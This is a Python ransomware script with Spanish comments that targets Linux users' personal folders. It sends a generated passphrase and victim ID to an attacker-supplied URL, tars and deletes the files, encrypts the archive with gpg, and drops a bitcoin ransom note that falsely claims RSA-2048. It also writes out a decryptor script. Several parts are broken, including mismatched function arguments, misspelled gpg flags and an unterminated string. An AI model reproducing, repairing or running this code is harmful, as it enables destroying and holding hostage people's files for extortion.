#!/usr/bin/python3

# By R3YW1N ;)

# Modulos que ocupamos
import os
import pwd
import sys
import subprocess
import random
import string
import requests
import re

def linux():
    # Verifica si es super usuario
    if(os.geteuid() == 0):
        directories.append('/root/')

    # Genera una contrasena de cifrado
    s = string.ascii_lowercase + string.digits
    pwd = str(''.join(random.sample(s,30)))

    # Genera un id unico
    t = string.ascii_lowercase
    idd = str(''.join(random.sample(s,10)))

    # Se ejecutan las funciones necesarias para cifrar datos
    sendCred(url, pwd, idd)
    crypt(directories, pwd)
    howto(directories, bitcoin, price)
    decryptGen(str(directories))

def sendCred(url, pwd, idd):
    values = {'pass' : pwd,'id'     : idd}
    r = requests.post(url, values)
    page = r.text
    if(page != 'Ok.'):
        sys.exit('Oh!, ocurrio un error al enviar las credenciales')

def crypt():

    if(type(directory) != list):
        sys.exit('El formato recibido es incorrecto')

    for dirr in directory:
        os.chdir(dirr)
        os.system('tar cvf encrypted.tar *')
        os.system('find . ! -name encrypted.tar -type f -delete')
        os.system('find . ! -name encrypted.tar -type d -delete')
        os.system('echo ' + pwd + ' | gpg --passphare-fd 0 -c encrypted.tar')
        os.system('rm encrypted.tar')
        os.system('../')
        print ("------------")

def howto(directory, bitcoin, price):
    txt = '\n'
    txt += "Hola te estaras pregunstando Que paso con tus archivos?\n"
    txt += "todos ellos fueron cifrados con RSA-2048\n"
    txt += "si quieres recuperar me debes pagar: """ + str(price) + "\n"
    txt += "Mi direccion bitcoin es: " + bitcoin + "\n"
    txt += "1 bitcoin -= 240 US $ aproximadamente"
    txt += "Cuando resivas el password usa el archivo decrypt.py"
    txt += "que tengas un lindo dia y mejor suerte para la otra :)"
    archivo = open("recuperar-mis-archivos.txt", "wb")
    archivo.write(txt)
    archivo.close()
    for dirr in directory:
        os.system("cp 'recuperar-mis-archivos.txt' " + dirr)

def decryptGen(directory):
    txt += ""
    txt += "#!/usr/bin/python3\n"
    txt += "import os\n"
    txt += "import sys\n"
    txt += "directory = " + directory + "\n"
    txt += "pwd = raw_input('ingrese el password para decifrar los archivos: ')\n"
    txt += "for dirr in directory:\n"
    txt += "    os.chdir(dirr)\n"
    txt += "    if(os.system('gpg --passphare ' + pwd + ' -d encrypted.tar.gpg > unencrypted.tar') != 0):\n"
    txt += "        sys.exit('Password Incorrecto!')\n"
    txt += "    os.system('tar xvf unencrypted.tar')\n"
    txt += "    os.system('rm unencrypted.tar')\n"
    txt += "    os.system('rm encrypted.tar.gpg')\n"
    txt += "    os.system('rm unencrypted.tar')\n"
    txt += "    os.system('rm recuperar-mis-archivos.txt')\n"
    txt += "    os.system('../)\n"
    archivo = open("decrypt.py","wb")
    archivo.write(txt)
    archivo.close()

directories = ['Documentos', 'Videos', 'Descargas', 'Imagenes', 'Musica'] # Directorios a cifrar
bitcoin = '' # Tu cuenta de bitcoin
price = '' # Ingresa el monto a pedir
url = '' # Ingresa url a donde vas a enviar el id y password

# Verificar que el sistema operativo este detras
if(sys.platform == 'Linux' or sys.platform == 'linux2'):
    linux()
elif(sys.platform == 'Windows'):
    sys.exit('Soon suported!')
else:
    sys.exit('Not suported!')